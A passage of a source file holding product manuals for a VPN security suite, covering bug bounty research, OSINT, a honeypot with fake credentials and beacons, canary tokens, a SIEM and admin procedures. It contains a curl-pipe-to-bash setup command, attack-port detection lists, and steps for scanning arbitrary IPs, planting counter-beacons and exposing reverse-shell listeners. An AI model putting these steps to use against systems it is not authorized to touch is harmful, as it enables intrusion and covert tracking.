     sessions on password change, logout, etc.

  d) Bug Bounty Authentication Testing:
     Use with your own test accounts on programs that allow
     authentication testing in their scope.

7. SESSION CLEANUP

  Sessions automatically expire after 4 hours. To manually clean up:
  1. Click the × next to each active session.
  2. Or wait for the 4-hour automatic cleanup.

  Note: The backend session store is in-memory only. Sessions are
  cleared when the API server restarts.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "bug-bounty-hub-manual",
    title: "Bug Bounty Research Hub",
    subtitle: "Complete guide to authorized security research across 19 major programs",
    version: "1.0",
    pages: 22,
    icon: Award,
    iconColor: "text-yellow-400",
    tier: "pro",
    content: `Bug Bounty Research Hub — User Manual
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview of Bug Bounty Programs
2. Supported Programs (19 programs)
3. Program Scope & Out-of-Scope Rules
4. Testing Methodology per Platform
5. OmniStrike Integration
6. Report Generator
7. Best Practices for Researchers

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The Bug Bounty Research Hub is a comprehensive reference and
  tooling center for authorized security research across major
  gaming, social, and developer platforms.

  CRITICAL RULE: You MUST register with the bug bounty platform
  (HackerOne, Bugcrowd, etc.) and read the full program policy
  BEFORE any testing. Testing without registration may result in
  legal action even if you find valid vulnerabilities.

2. SUPPORTED PROGRAMS (19 programs)

  Console / Gaming:
  • PlayStation / Sony — HackerOne — Up to $50,000
  • Xbox / Microsoft — MSRC — Up to $60,000
  • Epic Games — HackerOne — Up to $20,000
  • Steam / Valve — HackerOne — Up to $30,000 (invite)
  • Riot Games — HackerOne — Up to $25,000
  • Blizzard / Activision — HackerOne — Up to $20,000
  • Bungie (Destiny 2) — HackerOne — Up to $15,000
  • EA / Electronic Arts — Bugcrowd — Up to $15,000
  • Ubisoft Connect — Intigriti — Up to $20,000
  • Roblox — HackerOne — Up to $10,000
  • Nintendo — Email program — Case-by-case

  Social & Streaming:
  • Meta (Facebook/Instagram/WhatsApp) — Meta Whitehat — Up to $750,000
  • Google / YouTube — Google VRP — Up to $500,000
  • Discord — HackerOne — Up to $10,000
  • Reddit — HackerOne — Up to $10,000
  • GitHub — HackerOne — Up to $30,000
  • Twitch — HackerOne — Up to $15,000
  • Twitter / X — HackerOne — Up to $20,000
  • Spotify — HackerOne — Up to $10,000

3. PROGRAM SCOPE

  Each program in the Hub shows:
  • In-Scope: what assets and features you can test
  • Out-of-Scope: what you MUST NOT test

  Common out-of-scope items across all programs:
  • Social engineering or phishing
  • Denial of service attacks
  • Physical attacks on infrastructure
  • Issues requiring jailbroken/modified devices
  • Previously reported vulnerabilities

4. TESTING METHODOLOGY

  Each program includes a step-by-step testing guide:
  a) Set up test accounts specific to the platform
  b) Configure Burp Suite or OWASP ZAP to proxy the platform
  c) Map API endpoints using the app and documentation
  d) Test each endpoint for access control (IDOR) with two test accounts
  e) Check OAuth/token flows for open redirect, CSRF, leakage
  f) Document every finding with full request/response

5. OMNISTRIKE INTEGRATION

  From any program page, click "Launch in OmniStrike."
  OmniStrike will open pre-configured for that platform's domain.

  IMPORTANT: Only use OmniStrike on endpoints you're authorized to
  test and that are explicitly in-scope for the program. Always
  test on your own test accounts — never on other users' accounts.

6. REPORT GENERATOR

  The built-in Report Generator creates professional disclosure
  reports in HackerOne format:

  1. Select severity (Critical/High/Medium/Low)
  2. Enter the vulnerability type (e.g., "IDOR on user profile API")
  3. Enter the affected endpoint URL
  4. Describe the vulnerability and its impact
  5. Provide step-by-step reproduction steps
  6. Click "Copy Report" to copy to clipboard
  7. Paste directly into your HackerOne/Bugcrowd report

7. BEST PRACTICES

  DO:
  ✓ Register with the program before ANY testing
  ✓ Use your own test accounts exclusively
  ✓ Test in staging environments when available
  ✓ Report immediately if you accidentally access real user data
  ✓ Follow responsible disclosure timelines

  DON'T:
  ✗ Test out-of-scope assets (even if vulnerable)
  ✗ Use automated scanners without checking program rules
  ✗ Access, download, or store any real user data
  ✗ Disclose publicly before the program's disclosure deadline
  ✗ Submit duplicate reports

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "osint-recon-manual",
    title: "OSINT Recon Engine",
    subtitle: "15+ passive intelligence sources and recon methodology",
    version: "2.2",
    pages: 20,
    icon: Search,
    iconColor: "text-cyan-400",
    tier: "pro",
    content: `OSINT Recon Engine — User Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Intelligence Sources (15+)
3. Running a Recon
4. Interpreting Results
5. Integration with Bug Bounty Hub

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The OSINT Recon Engine queries 15+ passive intelligence sources
  in parallel to build a comprehensive profile of a target domain.
  All queries are routed through your ProxhqVPN tunnel.

  Use OSINT for: reconnaissance before authorized penetration testing,
  bug bounty target research, and infrastructure mapping.

2. INTELLIGENCE SOURCES

  Threat & IP Intelligence:
  • Shodan — Internet-wide banner scanning data
  • Censys — Certificate transparency + banner data
  • AbuseIPDB — IP abuse reports and scores
  • GreyNoise — Background scan classification
  • AlienVault OTX — Open threat exchange indicators
  • VirusTotal — URL/IP/domain reputation

  Domain & Certificate Intelligence:
  • Certificate Transparency Logs — Subdomains via CT log search
  • SecurityTrails — Historical DNS, subdomains, IPs
  • DNSDumpster — DNS record enumeration
  • Whois / RDAP — Registrant, nameservers, creation date

  Data Breach Intelligence:
  • HaveIBeenPwned — Email address breach history
  • IntelX — Deep/dark web mention search

  Web & Code Intelligence:
  • Wayback Machine — Historical snapshots of web pages
  • Google Dorking — Targeted search operator queries
  • GitHub Code Search — Leaked secrets in public repositories

3. RUNNING A RECON

  1. Navigate to OSINT Recon in the sidebar.
  2. Enter a target: domain, IP address, or email address.
  3. Select which intelligence sources to query.
  4. Click "Start Recon."
  5. Results appear as each source responds (parallel queries).

4. INTERPRETING RESULTS

  High-value findings for bug bounty:
  • Open ports/services on unexpected hosts (Shodan/Censys)
  • Subdomains not listed in the main scope (CT logs)
  • Leaked API keys in public GitHub repositories
  • Old web application versions with known CVEs (Wayback)
  • Email addresses exposed in breaches (HIBP)

5. INTEGRATION WITH BUG BOUNTY HUB

  Use OSINT Recon as the first step of bug bounty research:
  1. Enter the program's main domain.
  2. Map all subdomains and services.
  3. Cross-reference with program scope.
  4. Prioritize in-scope assets for further testing with OmniStrike.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "ghost-trap-manual",
    title: "Ghost Trap — Counter-Intelligence Platform",
    subtitle: "7-stage attacker deception, fingerprinting, tarpit, and Manual IP Investigator",
    version: "2.2",
    pages: 22,
    icon: Eye,
    iconColor: "text-cyan-400",
    tier: "pro",
    content: `Ghost Trap Counter-Intelligence Platform — User Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

IMPORTANT: Ghost Trap is a passive defensive and deception platform.
All tarpit and canary features operate on incoming attacker connections.
The Manual IP Investigator performs port scanning and OSINT on external
IPs — only investigate IPs you have lawful reason to query.
ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Architecture
2. 7-Stage Counter-Intel Pipeline
3. Lure Endpoints & Trap Configuration
4. Tarpit Settings
5. Fingerprinting Engine
6. Poisoned Response Templates
7. Embedded Beacons & Canary Integration
8. Hop Chain Visualization
9. Manual IP Investigator (NEW v2.1)
10. Auto-Block & Abuse Reporting
11. Counter-Intel Tab Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & ARCHITECTURE

  Ghost Trap is an active counter-intelligence system that turns
  attacker reconnaissance into wasted time and attribution data.
  When a scanner, bot, or human attacker probes your infrastructure,
  Ghost Trap identifies them, slows them down, poisons their tools,
  and automatically reports them — all without exposing any real data.

  Backend: Express API at /api/ghost-trap
  Frontend: /ghost-trap (Command Center Pro)
  Rate limit: 60 requests/min per IP

  Tabs:
  • Active Traps — live attacker sessions
  • Fingerprinting — OS/tool/JA3 analysis
  • Counter-Intel — manual investigation tools
  • Settings — tarpit level, lure config, beacon templates

2. 7-STAGE COUNTER-INTEL PIPELINE

  [1] Attacker Probes a Lure Endpoint
      Ghost Trap deploys decoy services on attacker-targeted paths:
      /admin, /wp-login, /.env, /phpinfo, SSH port 22, /config.php
      These are realistic-looking but entirely fake.

  [2] Tarpit — Wasting the Attacker's Time
      The connection is held open artificially, sending 1 byte/sec.
      A single attacker connection can be tied up for hours.
      Configure level in Settings: Low (30s), Medium (5m), High (2h).

  [3] Deep Fingerprinting
      TCP/IP stack fingerprinting, TLS ClientHello analysis, HTTP
      header ordering, and JA3 hash identify:
      • Attacker OS (Linux, Windows, macOS)
      • Tool in use (Nmap, Shodan crawler, Metasploit, Burp Suite)
      • Browser or scanner version

  [4] Poisoned Response
      Fake credentials, fake API keys, fake DB dumps, and fake server
      configs are returned — chosen to look authentic but be entirely
      non-functional. Format-valid but never real.

  [5] Embedded Beacon
      All poisoned data includes invisible canary tokens. When the
      attacker uses the fake credentials or opens the fake file, a
      beacon fires revealing their real IP, browser, and location.

  [6] Silk Web Trap
      Attackers who probe further are fed into the SilkWeb maze —
      an endless labyrinth of fake services, each logging every
      command and request.

  [7] Auto-Block + Authority Report
      Attacker IP is instantly blocklisted across all VPN nodes.
      Generates an AbuseIPDB submission and ISP abuse complaint
      template for repeat or aggressive attackers.

3. LURE ENDPOINTS & TRAP CONFIGURATION

  Default lure paths (always active):
    GET /admin             → Fake admin login (HTML form)
    GET /wp-login.php      → Fake WordPress login
    GET /.env              → Fake environment file with API keys
    GET /phpinfo.php       → Fake PHP info page
    GET /config.php        → Fake DB credentials config
    SSH port 22            → Tarpit daemon (holds SSH connections)

  Custom Lure Configuration (Settings → Lure Editor):
  • Add any path: /api/internal, /backup.zip, /database.sql
  • Set response type: JSON creds / HTML login / plaintext / binary
  • Set tarpit duration override per lure
  • Enable/disable per-lure beacon embedding

4. TARPIT SETTINGS

  Configure tarpit aggressiveness in Ghost Trap → Settings:

  Low  (30 seconds): Light touch — minimal resource use. Good for
    testing or when server resources are limited.

  Medium (5 minutes): Recommended for production. Wastes meaningful
    attacker time without consuming excessive connections.

  High (up to 2 hours): Maximum disruption. Each attacker connection
    held for up to 2 hours. Use only with adequate server resources
    and when under active attack. Monitor connection count in the
    System Monitor to avoid resource exhaustion.

5. FINGERPRINTING ENGINE

  The Fingerprinting tab shows real-time analysis of each attacker:

  OS Detection:
    Analyzes TCP window size, TTL values, and IP ID patterns.
    Accuracy: ~85% OS family, ~60% OS version.

  Tool Detection:
    • Nmap: Characteristic probe timing, OS detection probes
    • Shodan: Known Shodan crawler User-Agent strings and IP ranges
    • Metasploit: Specific payload patterns in requests
    • Burp Suite: Sequential request numbering, specific headers
    • curl/wget: Identifiable User-Agent strings (often unmodified)

  JA3 Hash:
    TLS ClientHello fingerprint. Cross-reference against known
    malicious tool JA3 databases for attribution.

  HTTP Header Ordering:
    Each browser and tool sends headers in a characteristic order.
    Ghost Trap records the exact order for fingerprint correlation.

6. POISONED RESPONSE TEMPLATES

  Templates (Settings → Fake Data Templates):

  Database Credentials:
    { "host": "db.internal", "user": "root",
      "password": "<32-char random>", "database": "users" }
    Note: These are never real. Always synthetic random values.

  AWS Credentials:
    [aws_access_key_id] = AKIA + 16 random uppercase chars
    [aws_secret_access_key] = 40 random base64 chars
    Includes fake CloudTrail-style alert instruction comments.

  SSH Private Key:
    Properly formatted 2048-bit RSA PEM key (procedurally generated,
    mathematically valid but for a non-existent server).

  API Key:
    Bearer token: sk_live_ + 24 random chars
    Mimics Stripe, Twilio, or SendGrid format depending on the lure.

  IMPORTANT: Audit templates in Settings periodically to confirm
  no real credential has been accidentally substituted.

7. EMBEDDED BEACONS & CANARY INTEGRATION

  All poisoned responses automatically embed a Ghost Trap canary URL.
  When the attacker uses the fake data, the canary fires and logs:
  • Real source IP (even through proxies, if JS executes)
  • Browser fingerprint
  • Timestamp of canary trigger
  • Referer (where the attacker opened the file from)

  The trigger appears in:
  • Ghost Trap → Active Traps → session detail → Canary Fired (orange badge)
  • Canary Tokens (/canary) → trigger log

8. HOP CHAIN VISUALIZATION

  The Hop Chain panel maps each attacker session across your
  infrastructure:

  How to read a hop chain:
  • Each node = one request/response exchange
  • Arrows show the attacker's navigation path
  • Node color:
      Green  = tarpit holding (ongoing)
      Orange = canary fired at this hop
      Red    = blocked (firewall auto-block triggered)
      Gray   = session ended (attacker gave up or timed out)

  Click any node to see:
  • Full request headers and body
  • Full poisoned response sent
  • Tarpit duration at this hop
  • Fingerprint data collected

9. MANUAL IP INVESTIGATOR (NEW v2.1)

  The Manual IP Investigator lets you investigate any suspicious IP
  you discover — without waiting for it to hit a lure first. This
  is designed for use alongside real-time terminal network monitoring.

  Access: Ghost Trap → Counter-Intel tab → Manual IP Investigator

  ── HOW TO FIND SUSPICIOUS IPs IN YOUR TERMINAL ─────────────────

  Run any of these commands to see active connections:

    netstat -an | grep ESTABLISHED
      Shows all established TCP connections (remote IP + port).

    ss -tnp
      Same as netstat but also shows the process that owns
      each connection. More reliable on modern Linux.

    ss -tnp | grep -v '127\.\|10\.\|192\.168'
      Filters out loopback and private IPs — shows only
      external connections your server is talking to.

    lsof -i -n -P | grep ESTABLISHED
      Shows established connections with the owning process name.
      Useful for identifying which application made a connection.

    iftop -n
      Real-time bandwidth per connection pair. Spot IPs sending
      or receiving unexpectedly large amounts of data.

  Look for:
  • IPs on non-standard ports: 4444, 1337, 31337, 6666, 9050
  • IPs connecting to ports you don't run services on
  • IPs in ISP ranges known for server hosting (Hetzner, OVH,
    DigitalOcean, Vultr, Linode) initiating connections to you
  • Connections your known application processes should not be making

  ── USING THE MANUAL IP INVESTIGATOR ──────────────────────────────

  Step 1: Copy the suspicious IP and port from your terminal output.
          Example: from "185.220.101.47:4444" — IP is 185.220.101.47,
          port is 4444.

  Step 2: Navigate to Ghost Trap → Counter-Intel tab.

  Step 3: Paste the IP into the IP Address field.

  Step 4: Enter the port number in the Port field (e.g. 4444).

  Step 5: Click Investigate.

  The system immediately runs in parallel:

  PORT SCAN:
    Checks your specified port FIRST, then scans 24 common
    attack/service ports. The result for your specified port is
    reported with a tailored message:

    OPEN:     "Port 4444 confirmed OPEN — the connection you saw
               in netstat is live. The host is actively running
               a service on this port."
    FILTERED: "Port 4444 is filtered (firewalled). The connection
               may be behind a cloud security group or NAT."
    CLOSED:   "Port 4444 is now CLOSED. The connection was
               ephemeral, already terminated, or from a rotating
               IP pool."

  OSINT:
    • Geolocation: country, city, latitude/longitude
    • ISP and AS Number (ASN)
    • Reverse DNS (PTR record)
    • Abuse contact email (from ARIN/RIPE/APNIC whois)
    • Known Tor exit node check
    • AbuseIPDB reputation score (if API key configured)

  Step 6: Review results. The target banner turns cyan to indicate
          a manual investigation (vs red for trap-log IPs).

  Step 7: If the IP is suspicious, use the action buttons:
    • Add to Firewall Block — immediately blocks across all nodes
    • Inject Counter-Beacon — plants a canary for attribution
    • Generate Abuse Report — creates ISP complaint template

  ── PORT SCAN DETAILS ─────────────────────────────────────────────

  Standard ports always checked (in addition to your specified port):
  22 (SSH), 23 (Telnet), 25 (SMTP), 53 (DNS), 80 (HTTP),
  443 (HTTPS), 445 (SMB), 1080 (SOCKS), 1337 (RAT common),
  3128 (Squid proxy), 3306 (MySQL), 3389 (RDP), 4444 (Metasploit),
  5432 (PostgreSQL), 5900 (VNC), 6379 (Redis), 6666 (IRC/botnet),
  8080 (HTTP alt), 8443 (HTTPS alt), 8888 (Jupyter), 9050 (Tor),
  9200 (Elasticsearch), 27017 (MongoDB), 31337 (elite/backdoor)

  Timeout per port: 2.5 seconds. Total scan time: ~5-15 seconds
  depending on network latency and number of open ports.

10. AUTO-BLOCK & ABUSE REPORTING

  Auto-Block:
    When Ghost Trap detects 3+ lure hits from the same IP within
    60 minutes, it automatically adds the IP to the Firewall block
    list across all VPN nodes. Manual override in Firewall → Rules.

  Abuse Report Template:
    Generated report includes:
    • WHOIS data for the attacker's IP
    • ISP abuse contact email
    • Timeline of all probe attempts with timestamps
    • Lure endpoints targeted
    • Fingerprint data (OS, tool, JA3)
    • Canary trigger data (if applicable)
    Submit to AbuseIPDB and the attacker's ISP ABUSE address.

11. COUNTER-INTEL TAB REFERENCE

  The Counter-Intel tab contains three tools:

  Manual IP Investigator (new v2.1):
    Paste any IP + port → full port scan + OSINT. Works on any
    public IP without it needing to be in the probe log first.

  Counter-Beacon Injector:
    Select any trapped IP and inject a targeted canary payload.
    Useful for IPs that hit lures but didn't receive an auto-beacon.

  Abuse Report Generator:
    Select any trapped or manually-investigated IP. Generates a
    complete abuse report ready to send to the ISP and AbuseIPDB.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "canary-tokens-manual",
    title: "Canary Token Generator",
    subtitle: "Invisible tripwires: HTTP, DNS, document, and AWS fake key tokens",
    version: "1.8",
    pages: 16,
    icon: Radio,
    iconColor: "text-amber-400",
    tier: "pro",
    content: `Canary Token Generator — User Manual
Version 1.8 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. What are Canary Tokens?
2. Token Types
3. Creating a Token
4. Deploying Tokens
5. Alert Configuration
6. Forensic Data Collected
7. Use Cases

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. WHAT ARE CANARY TOKENS?

  Canary Tokens are invisible tripwires that alert you the instant
  someone accesses a resource — a URL, DNS name, document, or
  fake AWS credential. They are used to detect:
  • Unauthorized access to internal systems
  • Data exfiltration (when hidden in documents)
  • Network intruders probing fake services
  • Insider threats accessing sensitive fake files

2. TOKEN TYPES

  HTTP Token:
  • A unique URL that triggers an alert when visited
  • Deploy in HTML pages, emails, wikis, or chat messages
  • Captures: IP, user agent, referrer, timestamp, geolocation

  DNS Token:
  • A unique hostname that triggers on DNS lookup
  • Works even through firewalls that block HTTP
  • Captures: DNS resolver IP, timestamp

  Document Token (Word/PDF):
  • Embed in a Word or PDF document
  • Triggers when the document is opened (pings home)
  • Captures: opener IP, timezone, software version

  AWS Fake Key Token:
  • Fake AWS access key/secret that alerts on use
  • Plant in code repositories, config files, or backups
  • Captures: AWS region, caller IP, service called

3. CREATING A TOKEN

  1. Go to Canary Tokens in the sidebar.
  2. Select token type.
  3. Enter a memo (what this token monitors).
  4. Enter your alert email.
  5. Click "Generate Token."
  6. Copy the token URL/hostname/credentials.

4. DEPLOYING TOKENS

  HTTP Token — deployment examples:
  • <img src="https://proxhqvpn.com/t/[TOKEN_ID]" width="1" height="1">
  • Hidden in HTML pages, email newsletters, wiki pages
  • In Slack/Discord messages in sensitive channels

  DNS Token:
  • Add as a hostname in a config file: db.host=[TOKEN_DNS]
  • Use as a "fake" internal hostname in documentation

  Document Token:
  • Name the file something enticing: "Q4_Payroll_2025.docx"
  • Place in shared drives, backups, or sent to test recipients

  AWS Fake Key:
  • Commit to a test repository
  • Add to a .env file in a shared codebase
  • Leave in a "forgotten" backup folder

5. ALERT CONFIGURATION

  Alerts are sent via email and displayed in the Beacon Alerts
  dashboard (Admin only).

6. FORENSIC DATA COLLECTED

  Each alert includes:
  • Source IP address
  • Geolocation (city, country, ISP)
  • HTTP headers (User-Agent, Accept-Language, etc.)
  • Timestamp (UTC)
  • Token memo (what it was monitoring)

7. USE CASES

  Security Team Monitoring:
  • Place tokens in sensitive folders — any access triggers alert.

  Penetration Test Detection:
  • Include tokens in scope — alerts confirm the test is active.

  Data Exfiltration Detection:
  • Embed in sensitive documents — if exfiltrated and opened, alerts.

  Honeypot Integration:
  • Deploy tokens alongside SilkWeb decoy services for
    comprehensive attacker tracking.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "siem-manual",
    title: "SIEM — Security Event Log",
    subtitle: "Unified event aggregation, correlation, and incident response",
    version: "2.2",
    pages: 14,
    icon: Database,
    iconColor: "text-emerald-400",
    tier: "pro",
    content: `SIEM Security Event Log — User Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Event Sources
3. Filtering & Searching
4. Severity Levels
5. Alert Correlation
6. Export & Reporting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The SIEM (Security Information and Event Management) dashboard
  aggregates security events from all ProxhqVPN systems into a
  single, searchable, real-time event log.

2. EVENT SOURCES

  WireGuard Events:
  • Peer connections and disconnections
  • New device handshakes
  • Key rotation events

  SilkWeb Honeypot Events:
  • Decoy service probe attempts
  • Scanner fingerprints
  • Credential stuffing attempts

  Firewall Events:
  • Blocked connection attempts
  • Port scan detections
  • GeoIP-based blocks

  DNS Sinkhole Events:
  • Malware domain resolution attempts
  • Tracker block counts
  • C2 beacon detections

  Authentication Events:
  • Failed login attempts
  • Successful authentications
  • Session anomalies

  Canary Token Events:
  • Token trigger alerts
  • Forensic data from each alert

3. FILTERING & SEARCHING

  Filter by:
  • Event source (WireGuard / Honeypot / Firewall / DNS / Auth / Canary)
  • Severity (Critical / High / Medium / Low / Info)
  • Time range (Last hour / 24h / 7d / 30d / Custom)
  • IP address or hostname
  • Free text search

4. SEVERITY LEVELS

  Critical: Active breach, RCE attempt, data exfiltration detected
  High: Successful credential attack, honeypot compromise
  Medium: Repeated scan attempts, brute force (stopped by rate limit)
  Low: Port scans, DNS block, probe attempts
  Info: Normal authentication events, connection logs

5. ALERT CORRELATION

  The SIEM automatically correlates related events:
  • IP seen in multiple event sources within 60 minutes → Linked
  • Same IP in firewall block + honeypot hit → Coordinated attack flag
  • Auth failure spike → Brute force alert

6. EXPORT & REPORTING

  Export events as:
  • JSON (machine-readable for SIEM integrations)
  • CSV (for spreadsheet analysis)
  • PDF (for incident reports)

  Automated daily and weekly reports can be configured in Settings.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "employee-procedures",
    title: "Employee Procedures & Platform Administration",
    subtitle: "Admin tools, employee access, audit logs, and platform operations",
    version: "1.5",
    pages: 20,
    icon: Terminal,
    iconColor: "text-green-400",
    tier: "both",
    content: `Employee Procedures & Platform Administration
Version 1.5 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
INTERNAL USE ONLY — DO NOT DISTRIBUTE

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Employee Access System
2. Admin Dashboard Overview
3. Terminal — Remote Server Shell
4. SQL Interface — Direct Database Access
5. Node Management — VPN Server Fleet
6. SilkWeb Honeypot Administration
7. Firewall Rule Management
8. System Monitor
9. Audit Trail & Compliance
10. Incident Response Procedures

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. EMPLOYEE ACCESS SYSTEM

  Employee accounts receive full Command Center Pro access.
  Admin accounts receive additional access to:
  • Terminal (rate-limited: 20 commands/minute)
  • Direct SQL interface (30 queries/minute)
  • Node management (add/remove VPN servers)
  • SilkWeb honeypot control
  • Firewall rule management

  Granting Employee Access:
  1. Admin → Employee Access in the sidebar.
  2. Enter the employee's registered email address.
  3. Click "Add Employee."
  4. Employee receives access on next sign-in.

  Revoking Access:
  1. Find the employee in the Employee Access list.
  2. Click "Remove" next to their entry.
  3. Access is revoked immediately.

2. ADMIN DASHBOARD OVERVIEW

  The Dashboard shows:
  • Active subscriptions (VPN Basic + Command Center Pro counts)
  • Monthly recurring revenue
  • Active VPN connections
  • Recent security events
  • Platform health metrics

3. TERMINAL — REMOTE SERVER SHELL

  The Terminal provides shell access to VPN nodes.
  IMPORTANT: All commands are logged with timestamps and the
  admin's user ID. The audit log is immutable.

  Rate limit: 20 commands per minute.
  Prohibited: rm -rf /, shutdown, reboot (require confirmation).

  Common admin commands:
  wg show              — Show WireGuard interface status
  systemctl status     — Check service status
  journalctl -n 100    — View system logs
  df -h                — Check disk usage
  free -h              — Check memory usage

4. SQL INTERFACE — DIRECT DATABASE ACCESS

  Provides direct PostgreSQL query access.
  Rate limit: 30 queries per minute.
  All queries are logged.

  NEVER run:
  DROP TABLE, TRUNCATE, DELETE without WHERE clause
  UPDATE without WHERE clause
  Any query modifying the subscriptions or payments tables directly

5. NODE MANAGEMENT

  Add a VPN Server Node:
  1. Admin → VPN Servers.
  2. Click "Add Node."
  3. Enter the server's public IP and region.
  4. Copy the setup script and run it on the server:
     curl -sSL [setup_script_url] | bash
  5. The node registers automatically.

  Remove a Node:
  1. Click the node in the VPN Servers list.
  2. Click "Remove Node."
  3. All active connections on this node are migrated automatically.

6. SILKWEB HONEYPOT ADMINISTRATION

  SilkWeb deploys decoy services to lure and fingerprint attackers.

  Decoy services available:
  • Fake SSH server (logs all connection attempts + credentials)
  • Fake web admin panel (/admin, /phpmyadmin, /wp-admin)
  • Fake database port (3306/5432 with fake responses)
  • Fake FTP server

  Alerts: All honeypot hits appear in SIEM and Beacon Alerts.

10. INCIDENT RESPONSE PROCEDURES

  Suspected breach detected:
  1. Check SIEM for the triggering event and IP.
  2. Block the attacker IP in Firewall.
  3. Review all events from that IP in the last 24 hours.
  4. If VPN node is compromised: Remove node, revoke all keys.
  5. Document incident in the admin notes field.
  6. Notify legal@alphauntechnologies.com within 24 hours.

  Data breach:
  1. Immediately revoke all compromised keys/tokens.
  2. Notify affected users within 72 hours (GDPR requirement).
  3. Contact legal@alphauntechnologies.com immediately.
  4. Do not discuss breach details on public channels.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
INTERNAL DOCUMENT — DO NOT DISTRIBUTE
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── VPN PRIVACY SUITE TOOLS ───────────────────────────────────────────────
  {
    id: "privacy-suite-tools",
    title: "VPN Privacy Suite Tools",
    subtitle: "GPS Spoofing, Port Forwarding, Dedicated IP, Meshnet, Data Broker Opt-Out",
    version: "1.0",
    pages: 18,
    icon: MapPin,
    iconColor: "text-green-400",
    tier: "both",
    content: `ProxhqVPN: VPN Privacy Suite Tools
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. GPS Spoofing (/gps-spoof)
2. Port Forwarding (/port-forward)
3. Dedicated Static IP (/dedicated-ip)
4. Meshnet (/meshnet)
5. Data Broker Opt-Out (/data-broker)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. GPS SPOOFING (/gps-spoof)

  Overview:
  GPS Spoofing lets you broadcast a fake GPS location at the VPN tunnel
  level, overriding your device's actual physical coordinates. All apps
  reading location data receive the spoofed coordinates.

  Use Cases:
  • Bypass geo-locked apps and streaming libraries by region
  • Security testing: validate location-based access controls
  • Privacy: prevent location-based profiling and tracking
  • QA testing: simulate users from different geographic regions

  How to Use:
  1. Navigate to /gps-spoof in the Command Center.
  2. Enter target latitude and longitude manually, or search by city/country.
  3. Set accuracy radius (meters) — lower values appear more realistic.
  4. Click "Apply Location Override."
  5. All subsequent app location reads return the spoofed coordinates.
  6. Click "Reset to Real Location" to restore actual GPS data.

  Supported Platforms:
  • Web browser (JavaScript navigator.geolocation API spoofing)
  • Android (via ADB mock location injection when developer mode enabled)
  • iOS (via provisioning profile — see setup guide at /guide)
  • Windows/Linux/macOS (via WireGuard tunnel metadata injection)

  Notes:
  • Some apps have secondary location signals (Wi-Fi triangulation, cell tower)
    that may override GPS. Enable full VPN routing to eliminate these.
  • Accuracy values below 5m may trigger anti-cheat systems in apps.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. PORT FORWARDING (/port-forward)

  Overview:
  Port Forwarding lets you expose services running on your local machine
  through the VPN tunnel, making them reachable from the public internet
  via your ProxhqVPN exit IP. Supports TCP, UDP, and dual-stack.

  Use Cases:
  • Host a game server, web server, or dev environment behind VPN
  • Remote access to home lab equipment without exposing your real IP
  • Penetration testing: expose listener ports for reverse shells
  • Run local services accessible to a specific team IP range

  How to Configure:
  1. Navigate to /port-forward.
  2. Click "Add Rule."
  3. Select protocol: TCP, UDP, or Both.
  4. Enter local port (on your machine) and external port (on the VPN exit IP).
  5. Optionally restrict by source IP CIDR (e.g., 10.0.0.0/8 for LAN only).
